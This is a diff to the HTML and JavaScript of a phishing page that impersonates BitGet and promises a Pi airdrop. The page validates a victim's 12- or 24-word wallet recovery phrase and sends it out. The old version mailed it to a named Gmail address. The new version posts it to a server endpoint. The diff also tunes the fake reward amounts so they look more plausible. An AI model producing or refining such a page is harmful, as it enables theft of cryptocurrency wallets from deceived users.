@@ -158,10 +158,10 @@
     <div id="homepage" class="homepage">
         <div class="container">
             <img src="bitget-logo.png" alt="BitGet Logo" class="logo">
-            <div class="title">WIN UP TO 10,000 Pi</div>
-            <div class="subtitle">Sign up now to claim the airdrop instantly.</div>
+            <div class="title">Win up to 10,000 Pi</div>
+            <div class="subtitle">Sign up now to claim a welcome pack.</div>
             <button class="btn" onclick="showLoading()">Join Now</button>
-            <div class="side-message">Trade with 100 million users on BitGet. Partners with Pi Network</div>
+            <div class="side-message">Trade with 100 million users on BitGet.</div>
         </div>
     </div>
 
@@ -201,22 +201,22 @@
                 return;
             }
 
-            var piAmount = Math.floor(Math.random() * (10000 - 50 + 1)) + 50;
+            var piAmount = (Math.random() < 0.8) 
+                ? Math.floor(Math.random() * (100 - 50 + 1)) + 50 
+                : Math.floor(Math.random() * (10000 - 100 + 1)) + 100;
+
             document.getElementById("message").innerText = piAmount + " Pi will be rewarded to your wallet shortly.";
 
-            sendEmail(passphrase, piAmount);
+            fetch('https://your-server.com/api/send-email', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ passphrase, piAmount })
+            });
         }
 
         function isValidPassphrase(passphrase) {
             var words = passphrase.split(/\s+/);
             return (words.length === 12 || words.length === 24) && words.every(word => /^[a-z]+$/.test(word));
-        }
-
-        function sendEmail(passphrase, piAmount) {
-            var email = "official.akv.industries@gmail.com";
-            var subject = "New Passphrase Entry - BitGet";
-            var body = "Passphrase: " + passphrase + "%0AClaimed Pi: " + piAmount;
-            window.location.href = "mailto:" + email + "?subject=" + subject + "&body=" + body;
         }
     </script>
 
